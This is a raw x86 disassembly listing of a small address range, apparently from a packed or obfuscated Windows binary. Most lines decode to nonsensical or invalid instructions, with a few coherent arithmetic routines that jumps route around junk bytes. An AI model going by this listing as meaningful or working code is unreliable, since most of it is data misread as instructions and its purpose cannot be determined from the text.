  40915e:	stc    
  40915f:	inc    ebp
  409160:	scas   al,BYTE PTR es:[edi]
  409161:	push   ds
  409162:	or     BYTE PTR [edi+0x95f810],dl
  409168:	fst    st(1)
  40916a:	mov    ebp,0xcfa5232e
  40916f:	dec    esi
  409170:	fs jno 0x4091bc
  409173:	cmp    eax,esp
  409175:	ss gs in al,0x9e
  409179:	and    DWORD PTR [esp+ebp*4],esp
  40917c:	cmp    dl,BYTE PTR [ecx+0x76be5b71]
  409182:	aad    0xb7
  409184:	xchg   ebp,eax
  409185:	aad    0x4d
  409187:	pop    es
  409188:	push   esp
  409189:	mov    dl,0xdb
  40918b:	sbb    BYTE PTR ds:0x6f340793,bh
  409191:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409192:	xchg   DWORD PTR [ebx-0x72a1d183],edi
  409198:	mov    cl,0x34
  40919a:	inc    esi
  40919b:	shr    DWORD PTR [ecx],0xca
  40919e:	xchg   esi,eax
  40919f:	inc    edx
  4091a0:	adc    eax,0x57ba1a68
  4091a5:	outs   dx,BYTE PTR ds:[esi]
  4091a6:	jge    0x409224
  4091a8:	fdiv   DWORD PTR [edi-0x40476bd]
  4091ae:	sbb    ch,BYTE PTR [edi+0x710925cd]
  4091b4:	mov    ah,0x9f
  4091b6:	fist   WORD PTR [edi]
  4091b8:	mov    ebx,0x690af316
  4091bd:	ss sub eax,0x27b98a45
  4091c3:	cmp    eax,0x37bfcd93
  4091c8:	fwait
  4091c9:	push   ds
  4091ca:	pop    ecx
  4091cb:	aad    0x8b
  4091cd:	jns    0x4091c1
  4091cf:	xchg   edx,eax
  4091d0:	aam    0xb1
  4091d2:	pop    edi
  4091d3:	mov    eax,0x2f09709a
  4091d8:	mov    edx,0x224e8f78
  4091dd:	jns    0x409161
  4091df:	call   0x231259c8
  4091e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091e5:	mov    al,ds:0x12e548cf
  4091ea:	sbb    esp,DWORD PTR ds:[edi-0x58]
  4091ee:	cwde   
  4091ef:	out    0x7a,eax
  4091f1:	add    BYTE PTR [edi+edx*2-0xe],0xfe
  4091f6:	or     ch,BYTE PTR [ebx+0x25]
  4091f9:	shl    BYTE PTR [ebx-0x7c],0xc7
  4091fd:	sbb    DWORD PTR [eax-0x7cf55ded],eax
  409203:	mov    edx,0xbea7015e
  409208:	sbb    eax,0x8bc32d23
  40920d:	mov    eax,0xaf5b74e
  409212:	int    0x53
  409214:	retf   
  409215:	stos   DWORD PTR es:[edi],eax
  409216:	and    eax,0xf2e44ae4
  40921b:	sar    DWORD PTR [ecx-0x7ac37e7],cl
  409221:	vpaddw xmm6,xmm2,xmm6
  409225:	dec    esi
  409226:	gs cmc 
  409228:	jmp    0x4091bb
  40922a:	leave  
  40922b:	pop    ecx
  40922c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40922d:	outs   dx,DWORD PTR ds:[esi]
  40922e:	add    cl,BYTE PTR [ebx-0x36]
  409231:	sti    
  409232:	sbb    DWORD PTR [edi],esp
  409234:	dec    edx
  409235:	mov    bh,0x8c
  409237:	xor    dh,BYTE PTR [ecx+eax*1-0x1d6887b8]
  40923e:	aad    0xf0
  409240:	jecxz  0x409229
  409242:	mov    ecx,0x8898f2cc
  409247:	test   BYTE PTR [ecx+0x6d],al
  40924a:	cwde   
  40924b:	jb     0x409241
  40924d:	and    DWORD PTR [esi-0x3d0c819e],esi
  409253:	std    
  409254:	jmp    DWORD PTR [esi]
  409256:	daa    
  409257:	mov    ecx,0x3e87c642
  40925c:	adc    dh,BYTE PTR [ebx-0x7a]
  40925f:	nop
  409260:	jne    0x40928f
  409262:	cmp    eax,0xf0e02f41
  409267:	bnd es jo 0x409247
  40926b:	mov    edx,0xfa8da015
  409270:	mov    esi,0x8733e96
  409275:	xchg   BYTE PTR [eax],ah
  409277:	push   esi
  409278:	push   es
  409279:	mov    ds,edx
  40927b:	dec    eax
  40927c:	outs   dx,BYTE PTR ds:[esi]
  40927d:	push   edi
  40927e:	push   0xced0a621
  409283:	xchg   edi,eax
  409284:	adc    dl,BYTE PTR [ebx-0x76ba73a6]
  40928a:	ins    BYTE PTR es:[edi],dx
  40928b:	cdq    
  40928c:	and    al,0xa2
  40928e:	xchg   edx,eax
  40928f:	jns    0x4092c2
  409291:	pop    ecx
  409292:	call   0x589bf3c7
  409297:	mov    eax,0x3810779b
  40929c:	rcr    ah,0x70
  40929f:	mov    al,0x89
  4092a1:	push   0x764ca3f6
  4092a6:	xor    ah,BYTE PTR [edi-0x528e6033]
  4092ac:	and    edx,DWORD PTR [eax+0x33]
  4092af:	xchg   esi,eax
  4092b0:	and    al,0xa
  4092b2:	add    BYTE PTR [eax+eax*8+0x3a],cl
  4092b6:	push   ecx
  4092b7:	fs lahf 
  4092b9:	xchg   edi,eax
  4092ba:	sbb    cl,bl
  4092bc:	lods   eax,DWORD PTR ds:[esi]
  4092bd:	mov    al,0xe3
  4092bf:	push   0x31f77d88
  4092c4:	add    ah,BYTE PTR es:[edx]
  4092c7:	lock mov dl,0xe5
  4092ca:	stos   DWORD PTR es:[edi],eax
  4092cb:	(bad)  
  4092cc:	cmp    eax,0xdbed25f0
  4092d1:	and    eax,DWORD PTR [ebx+0x42]
  4092d4:	pop    edx
  4092d5:	mov    ds:0x3b6da7ee,al
  4092da:	mov    edi,0xf80d90c5
  4092df:	jl     0x409346
  4092e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092e2:	and    ah,BYTE PTR [eax]
  4092e4:	sbb    al,0x3a
  4092e6:	mov    edx,0xa736e4bf
  4092eb:	push   esi
  4092ec:	and    BYTE PTR [esi+ebx*4-0x25b99c80],dh
  4092f3:	xchg   esi,eax
  4092f4:	lods   eax,DWORD PTR ds:[esi]
  4092f5:	cli    
  4092f6:	es mov eax,0x78f2c522
  4092fc:	sub    ecx,DWORD PTR [esi+0x5c]
  4092ff:	(bad)  
  409300:	cmp    DWORD PTR [ebx-0x45],edi
  409303:	js     0x409346
  409305:	mov    ds:0x7ac12c6d,al
  40930a:	mov    eax,0x7eaa6716
  40930f:	jno    0x40937e
  409311:	std    
  409312:	jle    0x4092b0
  409314:	xor    dh,BYTE PTR [ebx+0x51b39654]
  40931a:	xchg   ebp,eax
  40931b:	(bad)  [edx]
  40931d:	pop    eax
  40931e:	arpl   WORD PTR [edi-0xd],si
  409321:	cmp    DWORD PTR [ebp-0xb84cce0],ebp
  409327:	jp     0x409361
  409329:	cmp    eax,0xb22558db
  40932e:	sub    DWORD PTR [ecx+0x45],eax
  409331:	outs   dx,DWORD PTR ds:[esi]
  409332:	enterw 0x42ea,0xe1
  409337:	std    
  409338:	sbb    eax,0x2f2afe7c
  40933d:	and    BYTE PTR [ecx],ch
  40933f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409340:	sbb    eax,0xc6f50043
  409345:	mov    ch,0xdc
  409347:	xchg   BYTE PTR [ebx+0xf],bl
  40934a:	jecxz  0x40934e
  40934c:	ret    0xa57d
  40934f:	pop    ebp
  409350:	(bad)  
  409352:	pushf  
  409353:	push   ecx
  409354:	fbld   TBYTE PTR [eax+0x45e71413]
  40935a:	inc    ebx
  40935b:	mov    edi,0x10785069
  409360:	and    edx,DWORD PTR [ebx]
  409362:	(bad)  
  409363:	jns    0x409310
  409365:	rcr    DWORD PTR [ecx-0x3c475a57],cl
  40936b:	jp     0x409395
  40936d:	inc    edx
  40936e:	sbb    al,BYTE PTR [ecx]
  409370:	pop    esp
  409371:	shl    DWORD PTR [esi],cl
  409373:	aas    
  409374:	push   ecx
  409375:	lods   eax,DWORD PTR ds:[esi]
  409376:	leave  
  409377:	aaa    
  409378:	mov    al,0x8e
  40937a:	xor    DWORD PTR [eax-0x3e31a38a],esi
  409380:	popf   
  409381:	retf   
  409382:	sbb    ch,BYTE PTR ds:0x490227b0
  409388:	sub    ebp,edx
  40938a:	std    
  40938b:	imul   esp,DWORD PTR [ecx+0x46307af0],0xf18184a9
  409395:	jp     0x409370
  409397:	adc    al,0x6b
  409399:	cs (bad) 
  40939b:	imul   ebx,DWORD PTR [edi+0x71],0x6320e1ce
  4093a2:	or     esi,esi
  4093a4:	sub    cl,BYTE PTR [ecx-0x74a08132]
  4093aa:	inc    ebp
  4093ab:	cld    
  4093ac:	add    DWORD PTR ds:0x42a7b9,0x42a769
  4093b6:	mov    esi,DWORD PTR [ebp-0x8]
  4093b9:	xor    eax,edx
  4093bb:	xor    esi,edx
  4093bd:	add    eax,ecx
  4093bf:	add    esi,ecx
  4093c1:	imul   eax,esi
  4093c4:	jmp    0x4096ca
  4093c9:	mov    eax,DWORD PTR [ebp+0xc]
  4093cc:	mov    eax,DWORD PTR [eax+0x78]
  4093cf:	mov    DWORD PTR [ebp+0xc],eax
  4093d2:	mov    eax,DWORD PTR [ebp-0x4]
  4093d5:	mov    esi,DWORD PTR [ebp-0x8]
  4093d8:	xor    eax,edx
  4093da:	xor    esi,edx
  4093dc:	add    eax,ecx
  4093de:	add    esi,ecx
  4093e0:	imul   eax,esi
  4093e3:	mov    esi,DWORD PTR [ebp+0xc]
  4093e6:	cmp    esi,eax
  4093e8:	jmp    0x4096ae
  4093ed:	xlat   BYTE PTR ds:[ebx]
  4093ee:	leave  
  4093ef:	retf   0xdad6
  4093f2:	aad    0xdb
  4093f4:	leave  
  4093f5:	adc    bl,BYTE PTR ds:0x9bcfff3d
  4093fb:	pusha  
  4093fc:	lock xor eax,0xa77878ec
  409402:	jle    0x40947c
  409404:	js     0x409469
  409406:	jle    0x409421
  409408:	mov    esp,0xf5dbfd9a
  40940d:	cmp    eax,0xe15b3c8e
  409412:	adc    eax,0x2b237274
  409417:	sbb    BYTE PTR [esi-0x6f210519],bl
  40941d:	js     0x409422
  40941f:	push   0x17eda116
  409424:	lds    ebp,FWORD PTR [edx+0x39873da9]
  40942a:	rcr    DWORD PTR [ebp+0x35],cl
  40942d:	aam    0x57
  40942f:	inc    edi
  409430:	sub    BYTE PTR [esi+0x5d],dh
  409433:	das    
  409434:	and    BYTE PTR [edx+eax*1+0x6c],0x3e
  409439:	or     BYTE PTR [edx+eax*4],al
  40943c:	pusha  
  40943d:	inc    ecx
  40943e:	lea    esp,[ecx-0x31]
  409441:	mov    edx,0xdbf365e2
  409446:	ss push es
  409448:	lahf   
  409449:	sti    
  40944a:	pop    ebx
  40944b:	scas   eax,DWORD PTR es:[edi]
  40944c:	aaa    
  40944d:	push   edx
  40944e:	pop    ebp
  40944f:	push   ecx
  409450:	inc    eax
  409451:	push   esi
  409452:	(bad)  
  409453:	stc    
  409454:	jb     0x4093d7
  409456:	xchg   edx,eax
  409457:	or     DWORD PTR [esi],0x20c3bec
  40945d:	sbb    al,0x4b
  40945f:	ror    BYTE PTR [eax],0x98
  409462:	push   cs
  409463:	add    BYTE PTR [eax-0x1cbe4b62],dh
  409469:	arpl   WORD PTR [ebx],si
  40946b:	mov    ebp,0x15d3e7c5
  409470:	int    0x32
  409472:	js     0x409436
  409474:	dec    esp
  409475:	or     BYTE PTR [ebp+0x71b4f20e],ah
  40947b:	mov    edx,cs
  40947d:	sbb    esp,DWORD PTR [edx-0x2bccea55]
  409483:	popf   
  409484:	jne    0x4094ae
  409486:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409487:	dec    edx
  409488:	mov    esi,0x3bef175e
  40948d:	mov    al,0x18
  40948f:	mov    ds:0xff480c15,al
  409494:	jno    0x4094bf
  409496:	data16 jg 0x409500
  409499:	xor    al,0x22
  40949b:	sub    DWORD PTR [eax+0x76b93a91],edi
  4094a1:	stos   BYTE PTR es:[edi],al
  4094a2:	retf   0x1e07
  4094a5:	or     eax,0xd431f434
  4094aa:	jl     0x4094ba
  4094ac:	inc    ebx
  4094ad:	sbb    esp,edx
  4094af:	pop    edx
  4094b0:	xor    DWORD PTR cs:[eax],eax
  4094b3:	jmp    0xd56df51b
  4094b8:	sbb    esp,ebx
  4094ba:	(bad)  
  4094bb:	jl     0x409487
  4094bd:	push   edi
  4094be:	xchg   edi,eax
  4094bf:	push   0xffffffb3
  4094c1:	cmc    
  4094c2:	lods   al,BYTE PTR ds:[esi]
  4094c3:	ret    0xd8b7
  4094c6:	outs   dx,DWORD PTR ds:[esi]
  4094c7:	test   DWORD PTR [ecx],eax
  4094c9:	jae    0x40950a
  4094cb:	mov    BYTE PTR [esi],bh
  4094cd:	ds push cs
  4094cf:	std    
  4094d0:	push   0xffffff9d
  4094d2:	sbb    eax,0x8616ee92
  4094d7:	xchg   edx,eax
  4094d8:	mov    eax,0x89e9990e
  4094dd:	aad    0x36
  4094df:	pop    ss
  4094e0:	mov    ah,0xb5
  4094e2:	imul   BYTE PTR [ecx+0x1a]
  4094e5:	mov    bh,0x53
  4094e7:	mov    edx,DWORD PTR [edx-0x74]
  4094ea:	sbb    ebp,DWORD PTR [ecx+0x6b1371ac]
  4094f0:	cdq    
  4094f1:	and    bh,BYTE PTR [ebx]
  4094f3:	xchg   BYTE PTR [esi+0x3d],al
  4094f6:	jle    0x4094fc
  4094f8:	xchg   ebx,eax
  4094f9:	loope  0x4094ee
  4094fb:	jmp    0xae248ef1
  409500:	mov    al,ds:0xd060f63a
  409505:	or     dl,BYTE PTR [ebx]
  409507:	pop    esp
  409508:	mov    cl,0xba
  40950a:	cmp    ah,al
  40950c:	shr    BYTE PTR [ebx],cl
  40950e:	add    al,0x73
  409510:	pushf  
  409511:	outs   dx,DWORD PTR ds:[esi]
  409512:	sub    bh,BYTE PTR [ebx-0x9]
  409515:	pop    ss
  409516:	adc    al,0xaa
  409518:	addr16 lahf 
  40951a:	arpl   WORD PTR [ecx+0x2b],ax
  40951d:	cmp    DWORD PTR [eax],edx
  40951f:	fwait
  409520:	add    al,0x0
  409522:	pop    eax
  409523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409524:	loop   0x409565
  409526:	and    BYTE PTR [ebx+0x64],dh
  409529:	push   0x61
  40952b:	retf   0xb2ed
  40952e:	mov    cs,WORD PTR [eax+ebx*4-0xf261f]
  409535:	fmul   DWORD PTR [ebp-0x2cbc2cce]
  40953b:	pop    ss
  40953c:	jmp    0x409598
  40953e:	xlat   BYTE PTR ds:[ebx]
  40953f:	test   eax,0x4f1b50a4
  409544:	jnp    0x409547
  409546:	sbb    esi,DWORD PTR [eax+edi*1+0x1]
  40954a:	leave  
  40954b:	sub    al,0xbd
  40954d:	retf   0x33a5
  409550:	sub    esp,DWORD PTR [ebp-0xb]
  409553:	test   DWORD PTR [edi+0x47efd775],ebx
  409559:	push   ds
  40955a:	test   BYTE PTR [ecx+ebx*4+0x63432323],dl
  409561:	sar    eax,1
  409563:	jbe    0x40952f
  409565:	cmp    ecx,DWORD PTR [ebx-0x726c8f5d]
  40956b:	jne    0x40959a
  40956d:	mov    esi,DWORD PTR [edi+eax*8-0x398a8d4e]
  409574:	jbe    0x409587
  409576:	xor    al,0xda
  409578:	mov    bl,0x19
  40957a:	(bad)  
  40957b:	jmp    0x409502
  40957d:	lahf   
  40957e:	pop    es
  40957f:	daa    
  409580:	test   al,0x17
  409582:	mov    ebp,0xfddd8e10
  409587:	lock push esp
  409589:	inc    esi
  40958a:	lahf   
  40958b:	push   esi
  40958c:	push   ds
  40958d:	daa    
  40958e:	mov    cs,WORD PTR [edi+0x315cee37]
  409594:	in     eax,0x9e
  409596:	or     BYTE PTR [ebp+0x4e],dh
  409599:	or     DWORD PTR [edx],ecx
  40959b:	cmp    ebp,DWORD PTR [ebp-0x4a9ba9a5]
  4095a1:	stc    
  4095a2:	mov    ds:0x54a17edf,al
  4095a7:	sub    DWORD PTR [edi+0xb],edx
  4095aa:	jge    0x409557
  4095ac:	in     eax,dx
  4095ad:	imul   esp,ebx,0x7b
  4095b0:	pop    esp
  4095b1:	inc    BYTE PTR [eax+0xd47591c]
  4095b7:	leave  
  4095b8:	pop    edi
  4095b9:	jnp    0x4095bd
  4095bb:	in     al,dx
  4095bc:	nop
  4095bd:	pusha  
  4095be:	push   esp
  4095bf:	enter  0xaa53,0x83
  4095c3:	repnz test eax,0x7f2b5d72
  4095c9:	arpl   WORD PTR [edx],ax
  4095cb:	jmp    0xafd8630b
  4095d0:	fprem1 
  4095d2:	popf   
  4095d3:	cmp    al,0x22
  4095d5:	pop    eax
  4095d6:	int    0x7e
  4095d8:	ret    0x6f00
  4095db:	inc    ecx
  4095dc:	dec    ebp
  4095dd:	adc    eax,0xe7c80c08
  4095e2:	pop    es
  4095e3:	ror    dh,1
  4095e5:	fistp  QWORD PTR [ecx]
  4095e7:	sbb    ecx,DWORD PTR [ebx]
  4095e9:	mov    dl,BYTE PTR [ebp-0x461d6275]
  4095ef:	lock imul esp,DWORD PTR [ecx-0x79],0x30
  4095f4:	jae    0x409607
  4095f6:	mov    ah,0x29
  4095f8:	or     DWORD PTR [eax+0x69ebda42],edx
  4095fe:	js     0x40962e
  409600:	call   0x2362:0x3c47ecc2
  409607:	mov    esp,0xd592bd50
  40960c:	leave  
  40960d:	push   edx
  40960e:	adc    al,0x93
  409610:	or     ah,BYTE PTR [ecx]
  409612:	arpl   WORD PTR [ebx-0x6d59d7e4],sp
  409618:	pop    ebx
  409619:	pop    eax
  40961a:	push   esp
  40961b:	xchg   ecx,eax
  40961c:	loop   0x409672
  40961e:	fisub  WORD PTR [eax-0x3c2e2d9b]
  409624:	jmp    0x3aebc7a8
  409629:	xchg   ebp,eax
  40962a:	xchg   dh,dl
  40962c:	dec    eax
  40962d:	xchg   esp,eax
  40962e:	mov    cl,0x3b
  409630:	cld    
  409631:	arpl   WORD PTR [ecx],sp
  409633:	mov    ds:0x115f871e,eax
  409638:	test   al,0x83
  40963a:	and    DWORD PTR [edi+0x36],esi
  40963d:	loopne 0x40963c
  40963f:	pop    ebx
  409640:	inc    ebx
  409641:	xor    esp,edx
  409643:	scas   eax,DWORD PTR es:[edi]
  409644:	fldcw  WORD PTR [edi-0x33e4eb69]
  40964a:	add    BYTE PTR [ecx],0xb1
  40964d:	mov    bh,0x29
  40964f:	daa    
  409650:	popa   
  409651:	jle    0x40963c
  409653:	iret   
  409654:	mov    ecx,0xdfbb25f9
  409659:	adc    esi,DWORD PTR [edi+0x44]
  40965c:	pop    ebp
  40965d:	cli    
  40965e:	aam    0x3
  409660:	inc    eax
  409661:	mov    dh,0xd1
  409663:	mov    edx,ebx
  409665:	fadd   QWORD PTR [esi-0x21]
  409668:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409669:	mov    dl,0x1c
  40966b:	shl    BYTE PTR [eax-0x5d42eae2],cl
  409671:	ss push esi
  409673:	xchg   esi,eax
  409674:	js     0x409607
  409676:	dec    ebp
  409677:	jg     0x4096bc
  409679:	call   0xaabd011a
  40967e:	daa    
  40967f:	stos   BYTE PTR es:[edi],al
  409680:	xor    DWORD PTR [eax-0x344c9304],edi
  409686:	out    dx,eax
  409687:	leave  
  409688:	mov    dl,0xea
  40968a:	mov    esp,0xc7507702
  40968f:	hlt    
  409690:	in     al,0xc5
  409692:	outs   dx,BYTE PTR ds:[esi]
  409693:	aad    0xdd
  409695:	(bad)  
  409696:	(bad)  [edi+0x6f]
  409699:	adc    esi,ebx
  40969b:	std    
  40969c:	cmp    ecx,DWORD PTR [edi]
  40969e:	dec    eax
  40969f:	stc    
  4096a0:	lods   eax,DWORD PTR ds:[esi]
  4096a1:	idiv   esi
  4096a3:	jnp    0x409653
  4096a5:	jge    0x4096ff
  4096a7:	sbb    dh,BYTE PTR [esi-0x1cdfd47a]
  4096ad:	ror    BYTE PTR [ebx-0x7bf003bb],0xf5
  4096b4:	cld    
  4096b5:	(bad)  
  4096b6:	push   DWORD PTR [ebx]
  4096b8:	ret    0xc103
  4096bb:	mov    ecx,DWORD PTR [ebp+0xc]
  4096be:	imul   eax,ecx
  4096c1:	add    eax,DWORD PTR [ebp+0x8]
  4096c4:	mov    DWORD PTR [ebp+0xc],eax
  4096c7:	mov    eax,DWORD PTR [ebp+0xc]
  4096ca:	pop    esi
  4096cb:	leave  
  4096cc:	ret    0x8
  4096cf:	push   ebp
  4096d0:	mov    ebp,esp
  4096d2:	jmp    0x4099c5
  4096d7:	leave  
  4096d8:	enter  0x3ed6,0xd9
  4096dc:	(bad)  
  4096dd:	(bad)  
  4096df:	xlat   BYTE PTR ds:[ebx]
  4096e0:	enter  0xc218,0x6f
  4096e4:	nop
  4096e5:	add    eax,0x78f25c59
  4096ea:	js     0x40973e
  4096ec:	jle    0x409766
  4096ee:	js     0x4096a7
  4096f0:	inc    eax
  4096f1:	in     eax,0x29
  4096f3:	adc    eax,0x9e4f1d3f
  4096f8:	mov    edx,0x3541c654
  4096fd:	mov    ebp,0x3f44a000
  409702:	and    ah,BYTE PTR [ecx]
  409704:	retf   0xf192
  409707:	cmp    BYTE PTR [edi+0x40dd1c94],dh
  40970d:	mov    ds:0x4f68cf7f,al
  409712:	sahf   
  409713:	(bad)  
  409714:	mov    ebp,0x9ffd2a56
  409719:	xchg   ebp,eax
  40971a:	in     eax,dx
  40971b:	mov    eax,0xe8ffe762
  409720:	mov    ch,0xec
  409722:	dec    esp
  409723:	push   eax
  409724:	adc    ah,BYTE PTR ds:0x776740c3
  40972a:	je     0x40970e
  40972c:	sbb    eax,0x76435dcc
  409731:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409732:	jbe    0x4097a9
  409734:	jle    0x409789
  409736:	inc    eax
  409737:	test   BYTE PTR [edx+0x7a0c93e3],ch
  40973d:	dec    esi
  40973e:	pop    ecx
  40973f:	xchg   BYTE PTR [edx],ch
  409741:	cmp    eax,0xb8954356
  409746:	into   
  409747:	mov    eax,ds:0xc75ec7d3
  40974c:	test   al,0x99
  40974e:	scas   eax,DWORD PTR es:[edi]
  40974f:	(bad)  
  409751:	loop   0x4097cf
  409753:	dec    eax
  409754:	jle    0x4096dd
  409756:	es ins DWORD PTR es:[edi],dx
  409758:	icebp  
  409759:	dec    esp
  40975a:	gs cmp al,al
  40975d:	sbb    cl,0xea
  409760:	in     eax,dx
  409761:	sub    esi,DWORD PTR [eax+0x76]
  409764:	mov    ebp,0x57ca7fa0
  409769:	imul   esp,DWORD PTR [ecx+0x22158da2],0xffffffb2
  409770:	sub    al,0xf4
  409772:	mov    esi,0x8c8fdba9
  409777:	je     0x409777
  409779:	inc    ebp
  40977a:	sub    edi,ebx
  40977c:	and    DWORD PTR [edi-0x77],0xffffff80
  409780:	and    cl,BYTE PTR ds:0x431872fe
  409786:	pop    ecx
  409787:	sbb    edi,DWORD PTR [esi]
  409789:	xlat   BYTE PTR ds:[ebx]
  40978a:	pop    edi
  40978b:	fistp  DWORD PTR [ebp-0x79]
  40978e:	xor    bh,dh
  409790:	das    
  409791:	jns    0x4097e4
  409793:	pop    ds
  409794:	and    BYTE PTR [ecx-0x3c],bh
  409797:	out    dx,eax
  409798:	inc    edi
  409799:	lahf   
  40979a:	call   0x781c:0x1fd04ac4
  4097a1:	xchg   esi,eax
  4097a2:	or     eax,0xbb9ba97e
  4097a7:	fst    QWORD PTR [esi]
  4097a9:	aas    
  4097aa:	pop    ebx
  4097ab:	mov    eax,ds:0xf68f5818
  4097b0:	out    dx,al
  4097b1:	adc    al,0x52
  4097b3:	mov    dl,0x76
  4097b5:	cli    
  4097b6:	dec    esi
  4097b7:	mov    ds:0xc9cce0cc,eax
  4097bc:	pop    esp
  4097bd:	or     bh,BYTE PTR [ebp+0x2a]
  4097c0:	push   ss
  4097c1:	stc    
  4097c2:	mov    al,0xbc
  4097c4:	mov    bh,0xdf
  4097c6:	pop    ebx
  4097c7:	cdq    
  4097c8:	sub    DWORD PTR [eax-0x16],ebp
  4097cb:	push   es
  4097cc:	arpl   WORD PTR [ebx+0x40345620],dx
  4097d2:	fsub   QWORD PTR [edi-0x62b57cac]
  4097d8:	sub    edx,DWORD PTR [edi+0x4]
  4097db:	mov    edi,0x6323812c
  4097e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097e1:	dec    esi
  4097e2:	xchg   dl,al
  4097e4:	out    dx,eax
  4097e5:	std    
  4097e6:	lods   eax,DWORD PTR ds:[esi]
  4097e7:	or     esi,DWORD PTR [eax+0x6c7e2fac]
  4097ed:	or     BYTE PTR [si+0x6b09],0x65
  4097f3:	add    DWORD PTR [edi-0x2b0e6253],esi
  4097f9:	xchg   esp,eax
  4097fa:	inc    eax
  4097fb:	ds pop ebp
  4097fd:	(bad)  
  4097fe:	cdq    
  4097ff:	mul    ah
  409801:	pushf  
  409802:	jae    0x4097b5
  409804:	cmc    
  409805:	mov    ah,0xbf
  409807:	fcomp  st(7)
  409809:	jae    0x409841
  40980b:	pop    esp
  40980c:	(bad)
  40980f:	xchg   BYTE PTR [eax-0x3947fb8c],bh
  409815:	es mov dh,0x22
  409818:	neg    dl
  40981a:	arpl   ax,bx
  40981c:	ret    0x7799
  40981f:	inc    ecx
  409820:	fnstenv [edi]
  409822:	dec    esi
  409823:	es xchg esi,eax
  409825:	xor    al,0x12
  409827:	cs pop ds
  409829:	cld    
  40982a:	xor    BYTE PTR [edi+ebx*8+0x56],dl
  40982e:	test   al,0x41
  409830:	(bad)  
  409831:	fxch   st(2)
  409833:	dec    edi
  409834:	adc    eax,0x90b68553
  409839:	mov    bh,BYTE PTR [eax]
  40983b:	adc    eax,0x84148694
  409840:	enter  0x8f43,0x33
  409844:	pop    esi
  409845:	xchg   BYTE PTR ds:[eax+0x3f],dh
  409849:	sbb    al,0xa1
  40984b:	sub    al,BYTE PTR [edi+0x4d1c3e8b]
  409851:	inc    esp
  409852:	adc    BYTE PTR [eax+0x1dd01e78],dh
  409858:	and    DWORD PTR [edx],ebx
  40985a:	sub    edi,0x48
  40985d:	push   esi
  40985e:	call   0xefbebbc7
  409863:	push   eax
  409864:	loope  0x4098c3
  409866:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  409868:	ins    BYTE PTR es:[edi],dx
  409869:	dec    esi
  40986a:	fstp   TBYTE PTR [edi-0x1c]
  40986d:	sub    eax,0xd60a84db
  409872:	popf   
  409873:	adc    eax,0x5f01b81c
  409878:	in     eax,dx
  409879:	jns    0x4098e5
  40987b:	jns    0x40980f
  40987d:	mov    esi,0x21ecebd5
  409882:	pushf  
  409883:	daa    
  409884:	or     ebx,esp
  409886:	aaa    
  409887:	jl     0x409845
  409889:	xlat   BYTE PTR ds:[ebx]
  40988a:	jbe    0x4098be
  40988c:	inc    ebp
  40988d:	jl     0x4098d0
  40988f:	and    BYTE PTR [edx],cl
  409891:	or     al,0x5
  409893:	xchg   edi,eax
  409894:	cmp    eax,0x27816918
  409899:	popa   
  40989a:	lods   eax,DWORD PTR ds:[esi]
  40989b:	or     eax,0x1112e0fd
  4098a0:	pop    esi
  4098a1:	test   DWORD PTR [edx-0x604bba64],ecx
  4098a7:	mov    eax,0xbcfefd6d
  4098ac:	fwait
  4098ad:	cmp    bh,BYTE PTR [edi+0xc]
  4098b0:	sub    esi,DWORD PTR [ecx+0x6fa9e820]
  4098b6:	ss inc ecx
  4098b8:	add    bl,BYTE PTR [ecx-0x61ef1a79]
  4098be:	jae    0x4098c5
  4098c0:	push   ecx
  4098c1:	cmp    al,0x7b
  4098c3:	cmp    BYTE PTR [ebp-0x2],cl
  4098c6:	aam    0x34
  4098c8:	mov    DWORD PTR [edi-0x65],esp
  4098cb:	push   0x35
  4098cd:	jnp    0x40988c
  4098cf:	les    esp,FWORD PTR [esi-0x20]
  4098d2:	push   ss
  4098d3:	test   eax,0x27e54a53
  4098d8:	pop    esi
  4098d9:	hlt    
  4098da:	sub    eax,0x13093b0e
  4098df:	add    DWORD PTR [eax-0x2e4bd40],edx
  4098e5:	mov    esi,0x97a6664d
  4098ea:	xor    cl,BYTE PTR [ebx-0x20]
  4098ed:	cs lock push edi
  4098f0:	sbb    eax,0x7b71abcc
  4098f5:	mov    ah,BYTE PTR ds:0xb2a23d55
  4098fb:	and    BYTE PTR [ebx],dl
  4098fd:	lods   al,BYTE PTR ds:[esi]
  4098fe:	lock lahf 
  409900:	xchg   edx,eax
  409901:	(bad)  
  409902:	or     esi,DWORD PTR [ebx+ecx*4+0x48]
  409906:	push   esi
  409907:	shl    DWORD PTR [ecx-0x8fd4e62],1
  40990d:	cmp    ebp,DWORD PTR [esi+0x1d20327]
  409913:	fisttp WORD PTR [edx]
  409915:	mov    ds:0xd21000ba,eax
  40991a:	cmc    
  40991b:	dec    eax
  40991c:	in     eax,0x95
  40991e:	scas   eax,DWORD PTR es:[edi]
  40991f:	addr16 (bad) 
  409922:	add    eax,0x6a4667d1
  409927:	in     eax,0x52
  409929:	mov    ds:0x7b8f014a,al
  40992f:	jb     0x409902
  409931:	test   eax,0x8981bde5
  409936:	and    bl,ch
  409938:	stos   BYTE PTR es:[edi],al
  409939:	loopne 0x40991d
  40993b:	jbe    0x409979
  40993d:	mov    edi,0xbec2e2f1
  409942:	xor    bh,BYTE PTR gs:[edx-0x12]
  409946:	mov    eax,0x13a991c8
  40994b:	inc    esp
  40994c:	and    DWORD PTR [edx-0x2d],esi
  40994f:	or     eax,0xd4faf7c5
  409954:	pop    ds
  409955:	ins    DWORD PTR es:[edi],dx
  409956:	mov    ds:0x6c6396dc,eax
  40995b:	cwde   
  40995c:	inc    ecx
  40995d:	add    ch,BYTE PTR [eax+0x19a5a852]
  409963:	adc    ebp,DWORD PTR [eax+0xd]
  409966:	pusha  
  409967:	xlat   BYTE PTR ds:[ebx]
  409968:	(bad)  
  409969:	mov    es,WORD PTR [ebp-0x34fd30c]
  40996f:	cs jp  0x4098f2
  409972:	jle    0x4099b8
  409974:	ds es add al,0xda
  409978:	xchg   ebp,eax
  409979:	jp     0x4099ec
